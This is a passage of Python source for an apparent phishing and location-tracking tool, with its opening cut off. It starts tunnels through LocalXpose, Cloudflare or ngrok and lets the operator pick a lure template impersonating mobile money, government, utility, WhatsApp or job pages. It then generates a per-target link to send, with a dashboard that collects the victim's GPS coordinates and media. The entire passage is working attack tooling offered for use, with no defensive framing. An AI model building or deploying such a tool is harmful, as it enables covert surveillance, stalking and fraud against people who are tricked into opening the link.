    subdomain = input(f'{G}  [?] {C}LocalXpose subdomain > {W}').strip()
    if not subdomain:
        subdomain = 'rigbtrack'
    try:
        proc = subp.Popen(
            ['loclx', 'tunnel', 'http', '--to', f'localhost:{lport}', '--subdomain', subdomain],
            stdout=subp.PIPE, stderr=subp.PIPE
        )
        time.sleep(6)
        url = f'https://{subdomain}.loclx.io'
        utils.print(f'{G}  [+] {C}Tunnel: {W}{url}')
        try:
            import requests
            r = requests.get(f'{url}/api/keepalive', timeout=10)
            if r.status_code == 200:
                utils.print(f'{G}  [+] {C}Tunnel verified ✔{W}')
            else:
                utils.print(f'{Y}  [!] {C}Tunnel may still be starting...{W}')
        except Exception:
            utils.print(f'{Y}  [!] {C}Tunnel starting, give it a moment...{W}')
        return url, proc
    except FileNotFoundError:
        utils.print(f'{R}  [-] {C}loclx not found in PATH{W}')
        return None, None


def start_cloudflared(lport):
    utils.print(f'{G}  [+] {C}Starting Cloudflare tunnel...{W}')
    try:
        proc = subp.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{lport}'],
            stdout=subp.PIPE, stderr=subp.PIPE
        )
        for _ in range(40):
            line = proc.stderr.readline().decode('utf-8', errors='ignore')
            if not line:
                time.sleep(0.5)
                continue
            match = re.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', line)
            if match:
                url = match.group(0)
                utils.print(f'{G}  [+] {C}Tunnel: {W}{url}')
                return url, proc
        utils.print(f'{R}  [-] {C}Could not get tunnel URL{W}')
        return None, proc
    except FileNotFoundError:
        utils.print(f'{R}  [-] {C}cloudflared not found{W}')
        return None, None


def start_ngrok(lport):
    utils.print(f'{G}  [+] {C}Starting ngrok tunnel...{W}')
    try:
        subp.Popen(['ngrok', 'http', str(lport)], stdout=subp.DEVNULL, stderr=subp.DEVNULL)
        time.sleep(3)
        import requests
        resp = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
        data = resp.json()
        url = data['tunnels'][0]['public_url']
        if 'https' not in url:
            url = url.replace('http', 'https')
        return url, None
    except Exception as e:
        utils.print(f'{R}  [-] {C}ngrok failed: {str(e)}{W}')
        return None, None


# ═══════════════════════════════════════════
# TEMPLATE SELECTOR
# ═══════════════════════════════════════════
def select_template():
    templates = load_templates()
    utils.print(f'\n{C}  ┌──────────────────────────────────────────────────┐')
    utils.print(f'  │             SELECT TEMPLATE                       │')
    utils.print(f'  └──────────────────────────────────────────────────┘{W}\n')
    categories = {}
    for t in templates:
        cat = t.get('category', 'other')
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(t)
    cat_labels = {
        'money': f'{Y}── MOBILE MONEY ──{W}',
        'utility': f'{Y}── UTILITY ──{W}',
        'government': f'{Y}── GOVERNMENT ──{W}',
        'whatsapp': f'{Y}── WHATSAPP GROUPS ──{W}',
        'meeting': f'{Y}── MEETINGS ──{W}',
        'artisan': f'{Y}── JOBS / ARTISAN ──{W}',
        'other': f'{Y}── OTHER ──{W}'
    }
    for cat in ['money', 'utility', 'government', 'whatsapp', 'meeting', 'artisan', 'other']:
        if cat in categories:
            utils.print(f'  {cat_labels.get(cat, cat)}')
            for t in categories[cat]:
                utils.print(f"  {G}[{str(t['id']).rjust(2)}]{W} {t['icon']}  {t['desc']}")
            utils.print('')
    try:
        choice = int(input(f'{G}  [?] {C}Select template > {W}').strip())
        for t in templates:
            if t['id'] == choice:
                return t
        utils.print(f'{R}  [-] Invalid, using MTN MoMo{W}')
        return templates[0]
    except (ValueError, KeyboardInterrupt):
        utils.print(f'{R}  [-] Invalid, using MTN MoMo{W}')
        return templates[0]


# ═══════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════
def main():
    banner()
    template = select_template()
    target_name = input(f'{G}  [?] {C}Target name (optional) > {W}').strip()
    tid = uuid.uuid4().hex[:8]
    with data_lock:
        targets[tid] = {'created': datetime.now().isoformat(), 'template': template['dir_name'],
                         'name': target_name or tid, 'visits': 0}
        gps_data[tid] = []
        media_log[tid] = []
    save_targets()

    tunnel_url = None
    tunnel_proc = None
    if not args.no_tunnel:
        if args.tunnel == 'loclx':
            tunnel_url, tunnel_proc = start_loclx(port)
        elif args.tunnel == 'cloudflared':
            tunnel_url, tunnel_proc = start_cloudflared(port)
        elif args.tunnel == 'ngrok':
            tunnel_url, tunnel_proc = start_ngrok(port)

    if tunnel_url:
        link = f"{tunnel_url}/{template['url_path']}/{tid}"
        dashboard = f"{tunnel_url}/dashboard"
    else:
        link = f"http://localhost:{port}/{template['url_path']}/{tid}"
        dashboard = f"http://localhost:{port}/dashboard"

    utils.print(f"""
{G}  ╔══════════════════════════════════════════════════════╗
  ║         🎯 TRACKING LINK READY                       ║
  ╠══════════════════════════════════════════════════════╣
  ║  Template  :  {template['icon']} {template['name']:<38}║
  ║  Target    :  {(target_name or tid):<38}║
  ║  ID        :  {tid:<38}║
  ║  Mode      :  {Y}GPS SATELLITE ONLY{G}                     ║
  ╠══════════════════════════════════════════════════════╣{W}
{Y}  📎 SEND THIS LINK:{W}
  {link}

{Y}  📊 YOUR DASHBOARD:{W}
  {dashboard}

{Y}  🔑 DASHBOARD PASSWORD:{W}
  {DASHBOARD_PASSWORD}
{G}  ╚══════════════════════════════════════════════════════╝{W}

{Y}  [*] Waiting for target...{W}
{Y}  [*] Ctrl+C to stop{W}
""")

    def shutdown(sig, frame):
        utils.print(f'\n{R}  [-] Shutting down...{W}')
        save_targets()
        if tunnel_proc:
            tunnel_proc.terminate()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)


if __name__ == '__main__':
    main()
